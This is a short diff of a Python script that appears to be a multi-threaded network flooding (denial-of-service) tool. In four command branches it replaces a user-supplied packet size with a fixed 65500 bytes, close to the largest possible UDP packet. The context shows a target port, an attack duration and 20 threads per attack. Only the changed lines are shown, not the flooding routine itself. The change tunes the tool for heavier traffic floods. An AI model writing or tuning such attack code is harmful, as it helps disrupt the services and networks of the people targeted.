@@ -140,7 +140,7 @@ def main():
                     port = int(args[2])
                     duration = int(args[3])
                     end_time = time.time() + duration
-                    size = int(args[4])
+                    size = 65500
                     threads = 20
 
                     for _ in range(threads):
@@ -150,7 +150,7 @@ def main():
                     port = int(args[2])
                     duration = int(args[3])
                     end_time = time.time() + duration
-                    size = int(args[4])
+                    size = 65500
                     threads = 20
 
                     for _ in range(threads):
@@ -160,7 +160,7 @@ def main():
                     port = int(args[2])
                     duration = int(args[3])
                     end_time = time.time() + duration
-                    size = int(args[4])
+                    size = 65500
                     threads = 20
 
                     for _ in range(threads):
@@ -170,7 +170,7 @@ def main():
                     port = int(args[2])
                     duration = int(args[3])
                     end_time = time.time() + duration
-                    size = int(args[4])
+                    size = 65500
                     threads = 20
 
                     for _ in range(threads):
